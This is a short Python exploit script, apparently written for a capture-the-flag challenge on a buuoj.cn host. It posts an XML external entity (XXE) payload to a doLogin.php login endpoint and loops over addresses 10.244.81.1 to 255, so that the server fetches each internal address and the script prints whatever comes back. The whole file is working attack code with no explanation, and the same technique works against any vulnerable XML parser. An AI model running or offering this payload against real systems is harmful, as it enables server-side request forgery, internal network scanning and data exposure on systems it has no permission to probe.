import requests as res

url = "http://8f4d2ace-5338-4f77-a858-cce766bba500.node4.buuoj.cn:81/doLogin.php"
rawPayload = '<?xml version="1.0"?>' \
             '<!DOCTYPE user [' \
             '<!ENTITY payload1 SYSTEM "http://10.244.81.{}">' \
             ']>' \
             '<user>' \
             '<username>' \
             '&payload1;' \
             '</username>' \
             '<password>' \
             '23' \
             '</password>' \
             '</user>'
for i in range(1, 256):
    payload = rawPayload.format(i)
    # payload=rawPayload
    print(str("#{} =>").format(i), end='')
    try:
        resp = res.post(url, data=payload, timeout=0.3)
    except:
        continue
    else:
        print(resp.text, end='')
    finally:
        print('')
